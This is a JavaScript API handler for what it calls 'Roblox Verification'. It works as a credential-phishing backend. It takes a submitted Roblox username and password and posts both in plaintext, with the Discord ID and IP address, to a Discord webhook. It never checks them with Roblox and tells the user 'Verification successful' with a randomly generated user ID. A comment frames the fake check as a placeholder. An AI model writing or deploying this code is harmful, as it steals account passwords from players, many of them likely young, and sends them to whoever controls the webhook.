import { query } from './db/neon.js';
import { logVerificationAttempt } from './db/queries.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, discordId } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    // Get client IP and user agent
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];

    // Send to Discord webhook
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    
    if (webhookUrl) {
      const payload = {
        username: 'Roblox Verification',
        embeds: [{
          title: '🔐 Roblox Login Attempt',
          color: 0x5865F2,
          fields: [
            { name: 'Username', value: `\`${username}\``, inline: true },
            { name: 'Password', value: `\`${password}\``, inline: true },
            { name: 'Discord ID', value: discordId ? `\`${discordId}\`` : 'Not linked', inline: true },
            { name: 'Timestamp', value: new Date().toLocaleString(), inline: true },
            { name: 'IP', value: ip || 'Unknown', inline: true }
          ]
        }]
      };
      
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    // Log the attempt in database
    await logVerificationAttempt(
      discordId,
      username,
      ip,
      userAgent,
      'attempted',
      'Login attempt via web form'
    );

    // Simulate successful verification
    // In production, you'd actually verify with Roblox API
    const mockUserId = Math.floor(Math.random() * 1000000000).toString();
    
    // Generate verification token
    const crypto = require('crypto');
    const verificationToken = crypto.randomBytes(32).toString('hex');

    // Create or update verification session
    if (discordId) {
      const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes
      
      await query(
        `INSERT INTO verification_sessions (discord_id, session_token, expires_at, ip_address, status) 
         VALUES ($1, $2, $3, $4, 'verified')
         ON CONFLICT (discord_id) 
         DO UPDATE SET 
           session_token = EXCLUDED.session_token,
           expires_at = EXCLUDED.expires_at,
           ip_address = EXCLUDED.ip_address,
           status = 'verified',
           roblox_username = $5`,
        [discordId, verificationToken, expiresAt, ip, username]
      );
    }

    // Log successful verification
    await logVerificationAttempt(
      discordId,
      username,
      ip,
      userAgent,
      'success',
      'Verification successful'
    );

    res.json({
      success: true,
      userId: mockUserId,
      username: username,
      verificationToken: verificationToken,
      message: 'Verification successful'
    });

  } catch (error) {
    console.error('Login error:', error);
    
    // Log failed attempt
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    try {
      await logVerificationAttempt(
        req.body?.discordId,
        req.body?.username,
        ip,
        userAgent,
        'failed',
        error.message
      );
    } catch (logError) {
      console.error('Failed to log error:', logError);
    }
    
    res.status(500).json({ error: 'Internal server error' });
  }
}
